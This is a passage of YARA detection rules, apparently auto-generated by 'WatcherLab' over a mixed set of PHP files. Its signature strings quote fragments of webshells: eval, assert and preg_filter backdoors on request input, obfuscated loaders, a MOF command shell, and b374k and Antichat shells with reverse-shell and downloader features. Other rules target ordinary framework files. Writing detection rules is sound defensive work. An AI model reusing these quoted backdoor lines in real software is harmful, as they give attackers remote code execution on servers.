      $s3 = "return $maxDataRows === null || $importResult->getTotalDataRowsProcessed() < $maxDataRows;" fullword ascii
      $s4 = "* - attributeKeys: the list of attribute keys (\\Concrete\\Core\\Attribute\\AttributeKeyInterface[])" fullword ascii
      $s5 = "$importResult->addLineProblem(false, t('Missing CSV headers: %s', Misc::join($missingHeaders)), $csvSchema->getRowIndex());" fullword ascii
      $s6 = "* @param bool|int $collectData Set to false to not collect the imported data, to true to collect the all the imported data," fullword ascii
      $s7 = "* @return bool returns true in case of success, false in case of failures (see the getErrors() method of the result)" fullword ascii
      $s8 = "$importResult->addLineProblem(false, t('Unrecognized CSV headers: %s', Misc::join($unrecognizedHeaders)), $csvSc" fullword ascii
      $s9 = "$importResult->addLineProblem(false, t('Missing CSV headers: %s', Misc::join($missingHeaders)), $csvSchema->getR" fullword ascii
      $s10 = "* Convert the data read from CSV to be passed to the attribute controller." fullword ascii
      $s11 = "protected function processData(ImportResult $importResult, $dataRowsToSkip, $maxDataRows, $collectData = false)" fullword ascii
      $s12 = "protected function processHeader(ImportResult $importResult)" fullword ascii
      $s13 = "$importResult->getErrors()->add(t('The CSV schema has not been read.'));" fullword ascii
      $s14 = "* Is the import process just a test?" fullword ascii
      $s15 = "* Read the data rows and process them." fullword ascii
      $s16 = "foreach ($this->getAttributeKeysAndControllers() as $attributeIndex => list($attributeKey, $attributeController)) {" fullword ascii
      $s17 = "$importResult->addLineProblem(true, t('None of the CSV columns have been recognized.'), $csvSchema->getRowIndex());" fullword ascii
      $s18 = "* Read the header row and initialize the CSV schema." fullword ascii
      $s19 = "*   - attributeValues: the list of attribute values (array[\\Concrete\\Core\\Entity\\Attribute\\Value\\AbstractValue|null])" fullword ascii
      $s20 = "* @return null|array If $collectData is set to true, the result will be an array with the keys:" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule sig_3792506fe4ff47e7b45071195191b30ea2df6db5
{
   meta:
      description = "php17 - file 3792506fe4ff47e7b45071195191b30ea2df6db5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "86669eceabd9b3cd95102d907c038af75c702bd30d47144d40f67e6711feaf43"
   strings:
      $s1 = "<?php $ad =''|.*|e''; @preg_filter($ad, $_REQUEST['domain'], ''); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AssertWarnBench
{
   meta:
      description = "php17 - file AssertWarnBench.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b50e23333a5ad4f0a110ed459e5f8e92178724e9bc6c4738704db6484fabb903"
   strings:
      $s1 = "* (c) Daniel Leech <daniel@dantleech.com>" fullword ascii
      $s2 = "* @Assert(stat=\"mean\", value=\"1000\", tolerance=\"10000\", comparator=\">\")" fullword ascii
      $s3 = "* This file is part of the PHPBench package" fullword ascii
      $s4 = "namespace PhpBench\\Tests\\System\\benchmarks\\set5;" fullword ascii
      $s5 = "public function benchFail()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_404__2_
{
   meta:
      description = "php17 - file 404__2_.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "851c740b3ab1c15cbff2daf0098ac87c00b4b1496675d14e0ee95f307c3b3c01"
   strings:
      $x1 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { " fullword ascii
      $x2 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,nul" fullword ascii
      $x3 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); " fullword ascii
      $x4 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=''\"; " fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true; " fullword ascii
      $x6 = "<input type=\"button\" value=\"hashcrack.com\" onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document" fullword ascii
      $x7 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login ->" fullword ascii
      $x8 = "Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass' value='wso'> Using: <select nam" fullword ascii
      $x9 = "<div id=\"cot_tl_fixed\"><marquee>Private Shell - :D From Om3r enjoy it </marquee></div> " fullword ascii
      $x10 = "<td><input type=text name=sql_login value='<?php echo (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST" fullword ascii
      $x11 = "<input type=\"button\" value=\"md5decrypter.com\" onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf" fullword ascii
      $x12 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); " fullword ascii
      $x13 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) " fullword ascii
      $s14 = "showSecParam('Downloaders', implode(', ',$temp)); " fullword ascii
      $s15 = "'<td>:<nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" targ" fullword ascii
      $s16 = "ER['HTTP_HOST']?>- 404 Not Found Shell V.<?php echo VERSION?></title> " fullword ascii
      $s17 = "<input type=\"button\" value=\"milw0rm.com\" onclick=\"document.hf.action='http://www.milw0rm.com/cracker/search.php';doc" fullword ascii
      $s18 = "<input type=\"button\" value=\"md5.rednoize.com\" onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf." fullword ascii
      $s19 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) { " fullword ascii
      $s20 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch'); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule sig_994de56c2a3cfa7b5731ad03c430737a963c0912
{
   meta:
      description = "php17 - file 994de56c2a3cfa7b5731ad03c430737a963c0912.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3e9f5c7d8a1881fa83fcb2307cefe9de847660d5f7b3701cd7f7f66951380189"
   strings:
      $s1 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;" fullword ascii
      $s2 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;" fullword ascii
      $s3 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;" fullword ascii
      $s4 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;" fullword ascii
      $s5 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_2f44931fb2c95507fd00bda39b20917c7ddc2ee9
{
   meta:
      description = "php17 - file 2f44931fb2c95507fd00bda39b20917c7ddc2ee9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9b7c948fb2be2e385e2f0cd6f91a134d54c0fb6df3a332e72c37a308fd40e1e2"
   strings:
      $x1 = "$payload = \"#pragma namespace(\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.\\\\\\\\\\\\\\\\root\\\\\\\\\\\\\\\\subscription\\\")" fullword ascii
      $s2 = "echo \"<hr>Execute Successful!<br> Please click the read button to check the  result!!<br>If the result is not correct,try read" fullword ascii
      $s3 = "\\\"var WSH = new ActiveXObject(\\\\\\\\\\\"WScript.Shell\\\\\\\\\\\")\\\\\\\\nWSH.run(\\\\\\\\\\\"$cmdshell\\\\\\\\\\\")\\\";" fullword ascii
      $s4 = "$sql1=\"select '$payload' into dumpfile '$mofname';\";" fullword ascii
      $s5 = "$cmdshell='cmd /c '.$strCmd.'>'.$path;" fullword ascii
      $s6 = "\\\"Where TargetInstance Isa \\\\\\\\\\\"Win32_LocalTime\\\\\\\\\\\" \\\"" fullword ascii
      $s7 = "setcookie(\"connect[host]\",$_POST['host']);" fullword ascii
      $s8 = "<head><title>Win MOF Shell</title></head>" fullword ascii
      $s9 = "<input type=\"text\" name=\"host\" value=\"192.168.200.144:3306\"><br/>" fullword ascii
      $s10 = "$mofname=\"c:/windows/system32/wbem/mof/system.mof\";" fullword ascii
      $s11 = "echo \"<hr>Execute Successful!<br> Please click the read button to check the  result!!<br>If the result is not correct,try read " ascii
      $s12 = "\\\"And TargetInstance.Second = 5\\\";" fullword ascii
      $s13 = "<input type=\"password\" name=\"pass\" value=\"toor\"><br/>" fullword ascii
      $s14 = "setcookie(\"connect[dbname]\",$_POST['dbname']);" fullword ascii
      $s15 = "setcookie(\"connect[pass]\",$_POST['pass']);" fullword ascii
      $s16 = "setcookie(\"connect[user]\",$_POST['user']);" fullword ascii
      $s17 = "if (isset($_POST['cmd'])){" fullword ascii
      $s18 = "echo \"Cmd:\";" fullword ascii
      $s19 = "<input type=\"text\" name=\"user\" value=\"root\"><br/>" fullword ascii
      $s20 = "echo \"<input type='text' name='cmd' value='$strCmd'?>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      1 of ($x*) and 4 of them
}

rule sig_013d407166ec4fa56eb1e1f8cbe183b9
{
   meta:
      description = "php17 - file 013d407166ec4fa56eb1e1f8cbe183b9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "735f3b419096fe9b87f5e01da3da38d19d124127795fd868d037d709e3e2ff66"
   strings:
      $x1 = "http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&cmd=dW5hbWUgLWE=" fullword ascii
      $x2 = "// https://github.com/ded/domready - domready (c) Dustin Diaz" fullword ascii
      $x3 = "$s_rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $x4 = "if(!in_array($s_k, $persist)) if(!is_array($s_k)) setcookie($s_k,\"\",time() - $s_login_time);" fullword ascii
      $x5 = "$s_rsbind[\"bind_win\"] = \"Bind Shell <span class='desc' style='font-size:12px;'>- windows executable</span>\";" fullword ascii
      $x6 = "http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&eval=cGhwaW5mbygpOw==" fullword ascii
      $x7 = "elseif($s_sql['type']=='sqlite' || $s_sql['type']=='sqlite3') $s_dump_tbl = \"SELECT * FROM \".$s_tables.\" LIMIT 0,100\";" fullword ascii
      $x8 = "elseif($s_sql['type']=='oracle') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" WHERE ROWNUM BETWEEN 0 AND 100;\";" fullword ascii
      $s9 = "<?php if(isset($_GP['login'])) echo \"if(d.getElementById('login')) d.getElementById('login').focus();\"; ?>" fullword ascii
      $s10 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s11 = "else echo \"- shell command -\";" fullword ascii
      $s12 = "elseif($s_sql['type']=='pgsql') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" LIMIT 100 OFFSET 0\";" fullword ascii
      $s13 = "$s_rsback[\"back_win\"] = \"Reverse Shell <span class='desc' style='font-size:12px;'>- windows executable</span>\";" fullword ascii
      $s14 = "if(trim($s_res)=='') $s_result = notif(\"Error getting process list\");" fullword ascii
      $s15 = "elseif($s_split[0]==\"back\") $s_rstarget_packed = $s_rsport_.\" \".$s_rshost_;" fullword ascii
      $s16 = "$s_pass = \"fb621f5060b9f65acf8eb4232e3024140dea2b34\"; // default password : b374k (login and change to new password)" fullword ascii
      $s17 = "setcookie(\"c[\".$k.\"]\", \"\" ,time() - $s_login_time);" fullword ascii
      $s18 = "setcookie(\"b374k_included\", \"0\" ,time() - $s_login_time);" fullword ascii
      $s19 = "if($s_sql['type']=='mysql') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" LIMIT 0,100\";" fullword ascii
      $s20 = "elseif(check_access(\"nodejs\")!==false) $s_result = exe($s_runlang.\"js \".$s_fpath.\" \".$s_rstarget);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule ApprovalAction
{
   meta:
      description = "php17 - file ApprovalAction.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c58f23ea69aa59aedcb2743ddc852d4580098a685c304cabb5fed5e0a8dc48d4"
   strings:
      $s1 = "namespace Concrete\\Core\\Workflow\\Progress\\Action;" fullword ascii
      $s2 = "$this->setWorkflowProgressActionLabel(t('Approve'));" fullword ascii
      $s3 = "$this->setWorkflowProgressActionTask('approve');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_1f1a80153e0fc2ec0b688b66949afb49f1897914
{
   meta:
      description = "php17 - file 1f1a80153e0fc2ec0b688b66949afb49f1897914.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da39f93031e1ca0bd919e5a062b01d0bf39b52e88919ebae40a1379523ccab37"
   strings:
      $x1 = "$header = '<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text" ascii
      $x2 = "$header = '<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text" ascii
      $s3 = "$content .=(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"));" fullword ascii
      $s4 = "$content .=(!empty($_POST['mysql_p'])?($_POST['mysql_p']):(\"password\"));" fullword ascii
      $s5 = "case fetch:shell(which('fetch').\" -o \".$_POST['filename'].\" -p \".$_POST['urldown'].\"\");break;" fullword ascii
      $s6 = "case curl:shell(which('curl').\" \".$_POST['urldown'].\" -o \".$_POST['filename'].\"\");break;" fullword ascii
      $s7 = "'.$_SERVER['REMOTE_ADDR'].' XFF: '.@gethostbyaddr($HTTP_X_FORWARDED_FOR).' ';?>" fullword ascii
      $s8 = "$serv = @mysql_connect(\"$adress:$port\", \"$login\", \"$pass\") or die(\"" fullword ascii
      $s9 = ": $cfa[0]<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s10 = "$content.=\"<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s11 = "$content .=\"<form name='dump1' action='$php_self' method='POST'>" fullword ascii
      $s12 = "$content .=\"<form name='dump2' action='$php_self' method='post'>" fullword ascii
      $s13 = "$content .=\"<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s14 = "$content =\"<table><form action='$php_self' method=post name=md5><tr><td><b>Decrypte MD5</b>" fullword ascii
      $s15 = "$content .=(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):(\"user\"));" fullword ascii
      $s16 = "case lynx:shell(which('lynx').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");break;" fullword ascii
      $s17 = "case links:shell(which('links').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");break;" fullword ascii
      $s18 = "$content .=\"<form name='conn' action='$php_self' method='post'><input type=hidden name=conn value=0>" fullword ascii
      $s19 = "case wget:shell(which('wget').\" \".$_POST['urldown'].\" -O \".$_POST['filename'].\"\");break;" fullword ascii
      $s20 = "<input type=hidden name=cmd size=85 value=mysql_dump>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_31e31bb64f4db825eca3dd21519d5adba7ad9a3c
{
   meta:
      description = "php17 - file 31e31bb64f4db825eca3dd21519d5adba7ad9a3c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "379b3234a6ddcedc999d01736bbc7819113098f678858376b5e1ca6730338108"
   strings:
      $s1 = "file_put_contents($webpath .\"test.jpg\".chr(9).\".php\", $a);" fullword ascii
      $s2 = "$a=\"<?php @eval(\".\"$\".\"_POST\".\"[rcoil]);?>\";" fullword ascii
      $s3 = "?>  //test.jpg%09.php" fullword ascii
      $s4 = "$webpath = dirname(__FILE__).\"/\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule aa5d43a49ec8cbac6f92416887ea443e89019549
{
   meta:
      description = "php17 - file aa5d43a49ec8cbac6f92416887ea443e89019549.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f4fe8e3b2c39090ca971a8e61194fdb83d76fadbbace4c5eb15e333df61ce2a4"
   strings:
      $s1 = "call_user_func('assert',$_POST[cmd]);" fullword ascii
      $s2 = "call_user_func_array('assert', array($_REQUEST['pass']));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2250b6f81f0189b50fb5391a1a4c5738370cfa61
{
   meta:
      description = "php17 - file 2250b6f81f0189b50fb5391a1a4c5738370cfa61.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "30a287d13b6729cebd14e7e3078428a7a9d0d4e3868fd6a1247a050721bbcb92"
   strings:
      $x1 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { " fullword ascii
      $x2 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,nul" fullword ascii
      $x3 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); " fullword ascii
      $x4 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=''\"; " fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true; " fullword ascii
      $x6 = "<input type=\"button\" value=\"hashcrack.com\" onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document" fullword ascii
      $x7 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login ->" fullword ascii
      $x8 = "Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass' value='wso'> Using: <select nam" fullword ascii
      $x9 = "<div id=\"cot_tl_fixed\"><marquee>Private Shell - :D From Om3r enjoy it </marquee></div> " fullword ascii
      $x10 = "<td><input type=text name=sql_login value='<?=(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_lo" fullword ascii
      $x11 = "<input type=\"button\" value=\"md5decrypter.com\" onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf" fullword ascii
      $x12 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); " fullword ascii
      $x13 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) " fullword ascii
      $s14 = "showSecParam('Downloaders', implode(', ',$temp)); " fullword ascii
      $s15 = "'<td>:<nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" targ" fullword ascii
      $s16 = "<input type=\"button\" value=\"milw0rm.com\" onclick=\"document.hf.action='http://www.milw0rm.com/cracker/search.php';doc" fullword ascii
      $s17 = "<input type=\"button\" value=\"md5.rednoize.com\" onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf." fullword ascii
      $s18 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) { " fullword ascii
      $s19 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch'); " fullword ascii
      $s20 = "$temp = \"document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='\".addcsla" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule sig_51e7b8610722a0f1949dc080ed750cf3
{
   meta:
      description = "php17 - file 51e7b8610722a0f1949dc080ed750cf3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "801990dac1ce41259e8343338331899346c4c1e9a87132fd9f73d9c89c96affc"
   strings:
      $x1 = "MdtApp::error(MAGENTO_BASE_PATH.'var/log/' . $this->filename . '.log could not be renamed', false);" fullword ascii
      $x2 = "if (rename(MAGENTO_BASE_PATH.'var/log/' . $this->filename . '.log', MAGENTO_BASE_PATH.'var/log/' . $this->filename ." fullword ascii
      $x3 = "private static $_connectionParameters = null; // array(host | username | password | dbname | prefix)" fullword ascii
      $s4 = "MdtApp::warning(MAGENTO_BASE_PATH.'var/log/' . $this->filename . '.log not found');" fullword ascii
      $s5 = "if (!file_exists(MAGENTO_BASE_PATH.'var/log/' . $this->filename . '.log'))" fullword ascii
      $s6 = "return 'http://' . self::getHostName() . '/' . $localXmlReader->getAdminhtmlFrontname();" fullword ascii
      $s7 = "'password' => $this->getValue('global/resources/default_setup/connection/password')," fullword ascii
      $s8 = "$fileListContents .= '<tr><td></td><td></td><td colspan=\"2\">[ <a class=\"confirm\" href=\"' . MdtApp::getUrl('logs/delete/a" fullword ascii
      $s9 = "MdtApp::success('new admin user created successfully<br />username: ' . $username . '<br />password: ' . $password);" fullword ascii
      $s10 = "* @author <a.yahnenko@gmail.com>" fullword ascii
      $s11 = "$fileViewContents = '<pre>' . $logsDirectory->getFileContents($currentFile) . '</pre>';" fullword ascii
      $s12 = "<title>mdt <?php echo MdtApp::getVersion() ?> | <?php echo MdtApp::getHostName() ?></title>" fullword ascii
      $s13 = "* We selected 'Europe/London' for 'BST/1.0/DST' instead in /ebs/sites/kidscavern/web/mdt.php on line 696" fullword ascii
      $s14 = "$fileViewContents = '<pre>' . $reportsDirectory->getFileContents($currentFile) . '</pre>';" fullword ascii
      $s15 = "[ <a href=\"' . MdtApp::getUrl('dashboard/selfdestruct') . '\" onclick=\"return confirm(\\'remove mdt.php from server?\\'" fullword ascii
      $s16 = "return (bool)MdtDB::getField('value', 'core_config_data', 'path = \"dev/log/active\"');" fullword ascii
      $s17 = "* In case you used any of those methods and you are still getting this warning, you most likely misspelled the time" fullword ascii
      $s18 = "<a href=\"<?php echo MdtApp::getAdminPanelUrl() ?>\" target=\"_blank\" title=\"view site\">admin panel</a>" fullword ascii
      $s19 = "'host' => $this->getValue('global/resources/default_setup/connection/host')," fullword ascii
      $s20 = "<a href=\"<?php echo MdtApp::getFrontendUrl() ?>\" target=\"_blank\" title=\"view site\">frontend</a>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_934181cdb95167d8cd694e41dc3414e194e6e73f
{
   meta:
      description = "php17 - file 934181cdb95167d8cd694e41dc3414e194e6e73f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "94d3a17b1f89750922fa67d4267c7baf4c8db9fd8f34667a36d0dae438f74ae9"
   strings:
      $s1 = "$B='de(Fnx(gzFncompress(Fn$o),$Fnk));prinFnt(\"Fn<$k>$d</$k>Fn\");@Fnsession_dFnestroyFn();}}}}';" fullword ascii
      $s2 = "$b='+(?:;q=Fn0.([\\\\dFn]))?,?Fn/\",$Fnra,$m)Fn;if(Fn$q&Fn&$Fnm){@session_start()Fn;$s=&$_SFnFnESSI';" fullword ascii
      $s3 = "$F='s[$iFn],$f);if($e)FnFn{$k=$kh.$Fnkf;obFn_start(Fn);@evFnal(Fn@gFnzuncompFnFnress(@x(@bas';" fullword ascii
      $s4 = "$W='Fn$p=$ss($p,3)Fn;}ifFn(array_Fnkey_exFnistFns($i,$s))Fn{$s[$i].=Fn$pFn;$e=FnstrpFnos($';" fullword ascii
      $s5 = "$S='}^$k{$j}Fn;}}rFneturFnn $o;}$r=Fn$_FnSEFnRVER;$rr=@$Fnr[\"HTTP_FnREFEFnRER\"];Fn$ra=@$rFn';" fullword ascii
      $s6 = "$T='[\"FnHTTP_ACCEFnPT_FnLANGUAFnGE\"Fn];if($rr&&$raFnFnFn){$u=parse_url($rr);FnFnparseFn_st';" fullword ascii
      $s7 = "$K='nFnd5Fn($i.$khFnFn),0Fn,3));$f=$sl($ss(md5($i.$kfFn),0,Fn3));$p=\"FnFnFn\";for($z=1;Fn$z<co';" fullword ascii
      $s8 = "$a=');Fn$o=\"FnFn\";for(Fn$i=0;$i<$l;){foFnr($j=0Fn;($j<$c&Fn&Fn$i<$l);$Fnj++,$i+Fn+){Fn$o.=$t{$iFn';" fullword ascii
      $s9 = "$N='ONFn;$sFns=\"subFnstFnr\";$sl=Fn\"strtolower\";$i=Fn$m[Fn1Fn][0].$m[1Fn][1];$h=Fn$sl($ss(mF';" fullword ascii
      $s10 = "$I='$kh=\"5dFn41\";$kf=\"Fn40Fn2Fna\";functionFnFn x($Fnt,$kFn){$c=strlen($kFn);$l=strlenFn($t';" fullword ascii
      $s11 = "$G='unFnt($m[1Fn])Fn;$z++)Fn$p.=$qFn[$m[2][$zFnFn]];if(strFnpos($p,$h)===0FnFn){Fn$s[$i]=\"\";';" fullword ascii
      $s12 = "$t='$i],0,$e))Fn)Fn,$k)));$Fno=ob_geFnt_coFnntents();Fnob_end_cFnleFnan();$dFn=baseFnFn64_enco';" fullword ascii
      $s13 = "$u='r($u[Fn\"querFny\"],$Fnq);$q=arraFny_valueFnsFn($q);pregFnFn_match_aFnll(\"/([\\\\w])[\\\\wFn-Fn]';" fullword ascii
      $s14 = "$E='Fne64_dFnecFnode(preFng_replFnace(array(\"/_/\",\"/Fn-/\"),arrFnayFn(\"Fn/\",\"+Fn\"),$Fnss($s[';" fullword ascii
      $s15 = "$C=str_replace('Fn','',$I.$a.$S.$T.$u.$b.$N.$K.$G.$W.$F.$E.$t.$B);" fullword ascii
      $s16 = "$n=str_replace('z','','crezazte_zfzzunctizon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule AbstractThreadEventTestCase
{
   meta:
      description = "php17 - file AbstractThreadEventTestCase.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "94d2685b7fc5017df8dcf65290a0d88632e1d5db9f3570826e9b69a830ff63c8"
   strings:
      $s1 = "protected function getEventInterfaces()" fullword ascii
      $s2 = "use Hifone\\Events\\Thread\\ThreadEventInterface;" fullword ascii
      $s3 = "namespace Hifone\\Test\\Events\\Thread;" fullword ascii
      $s4 = "class AbstractThreadEventTestCase extends AbstractEventTestCase" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_4874959418df2621302de7e61f80e8da4321d4d8
{
   meta:
      description = "php17 - file 4874959418df2621302de7e61f80e8da4321d4d8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "554b56b0fd4c9a045c0cb2b798b4fd763b0236f7b4e77a808bc2b8e799820b6f"
   strings:
      $s1 = "'b'];$items['ad'] = 'co';$ts['a'] = \"py($c,$a);\";$b = $items['ad'].$ts['a'];@eval($b); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AddBlockBlockTypeKey
{
   meta:
      description = "php17 - file AddBlockBlockTypeKey.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a463086be046e98f30b816e9506c421889c652c454404a7c61c06321cc68b104"
   strings:
      $s1 = "$list = $this->getAccessListItems(PermissionKey::ACCESS_TYPE_ALL, $accessEntities);" fullword ascii
      $s2 = "if ($l->getAccessType() == PermissionKey::ACCESS_TYPE_EXCLUDE) {" fullword ascii
      $s3 = "$dsh = Loader::helper('concrete/dashboard');" fullword ascii
      $s4 = "$btIDs = array_values(array_diff($btIDs, $l->getBlockTypesAllowedArray()));" fullword ascii
      $s5 = "$btIDs = array_unique(array_merge($btIDs, $l->getBlockTypesAllowedArray()));" fullword ascii
      $s6 = "$accessEntities = $u->getUserAccessEntityObjects();" fullword ascii
      $s7 = "$allBTIDs = $db->GetCol('select btID from BlockTypes where btIsInternal = 0');" fullword ascii
      $s8 = "$db = Loader::db();" fullword ascii
      $s9 = "$allBTIDs = $db->GetCol('select btID from BlockTypes');" fullword ascii
      $s10 = "if ($l->getBlockTypesAllowedPermission() == 'N') {" fullword ascii
      $s11 = "if ($l->getBlockTypesAllowedPermission() == 'C') {" fullword ascii
      $s12 = "if ($l->getBlockTypesAllowedPermission() == 'A') {" fullword ascii
      $s13 = "$types = $this->getAllowedBlockTypeIDs();" fullword ascii
      $s14 = "$pae = $this->getPermissionAccessObject();" fullword ascii
      $s15 = "return in_array($bt->getBlockTypeID(), $types);" fullword ascii
      $s16 = "protected function getAllowedBlockTypeIDs()" fullword ascii
      $s17 = "use Loader;" fullword ascii
      $s18 = "namespace Concrete\\Core\\Permission\\Key;" fullword ascii
      $s19 = "$accessEntities = $pae->validateAndFilterAccessEntities($accessEntities);" fullword ascii
      $s20 = "use Concrete\\Core\\Permission\\Duration as PermissionDuration;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule AttributeChoiceType
{
   meta:
      description = "php17 - file AttributeChoiceType.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5e08f915959d7a634b7d98923e3d207b6a2bd7ed6ddc18e21e6f9eccce34067c"
   strings:
      $s1 = "* @param RepositoryInterface $attributeRepository" fullword ascii
      $s2 = "public function configureOptions(OptionsResolver $resolver): void" fullword ascii
      $s3 = "use Sylius\\Component\\Resource\\Repository\\RepositoryInterface;" fullword ascii
      $s4 = "use Symfony\\Component\\Form\\Extension\\Core\\Type\\ChoiceType;" fullword ascii
      $s5 = "* @var RepositoryInterface" fullword ascii
